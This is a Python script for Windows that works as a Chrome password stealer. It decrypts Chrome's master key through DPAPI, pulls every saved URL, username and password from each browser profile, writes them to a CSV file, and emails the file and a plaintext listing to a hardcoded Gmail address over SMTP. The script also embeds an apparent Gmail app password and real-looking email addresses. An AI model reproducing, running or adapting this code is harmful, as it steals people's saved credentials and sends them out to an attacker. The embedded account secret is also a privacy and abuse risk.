import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

# Gmail credentials (replace with your actual Gmail credentials)
GMAIL_ADDRESS = "officialgujar@gmail.com"
GMAIL_PASSWORD = "lewi gmww kkko oxfs"  # Replace with the app password you generated
RECEIVER_EMAIL = "aryanesingh0500@gmail.com"

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def send_email(subject, body, attachment_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = GMAIL_ADDRESS
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject

        # Attach email body
        msg.attach(MIMEText(body, 'plain'))

        # Attach CSV file
        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(attachment_path)}')
        msg.attach(part)

        # Connect to Gmail SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        # Login to Gmail
        server.login(GMAIL_ADDRESS, GMAIL_PASSWORD)
        
        text = msg.as_string()
        # Send email
        server.sendmail(GMAIL_ADDRESS, RECEIVER_EMAIL, text)

        # Quit the server
        server.quit()
        print("Email sent successfully")
    
    except Exception as e:
        print("[ERR] Failed to send email: %s" % str(e))

if __name__ == '__main__':
    try:
        decrypted_passwords = []

        secret_key = get_secret_key()
        if not secret_key:
            raise Exception("Failed to retrieve Chrome secret key")

        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        decrypted_passwords.append((index, url, username, decrypted_password))
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")

        # Write decrypted passwords to CSV
        csv_file = 'decrypted_password.csv'
        with open(csv_file, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            for decrypted_password in decrypted_passwords:
                csv_writer.writerow(decrypted_password)

        # Send email with decrypted passwords CSV attached
        email_subject = "Decrypted Chrome Passwords"
        email_body = "\n".join(f"URL: {url}\nUser Name: {username}\nPassword: {password}\n{'*' * 50}\n"
                              for _, url, username, password in decrypted_passwords)
        send_email(email_subject, email_body, csv_file)

    except Exception as e:
        print("[ERR] %s" % str(e))
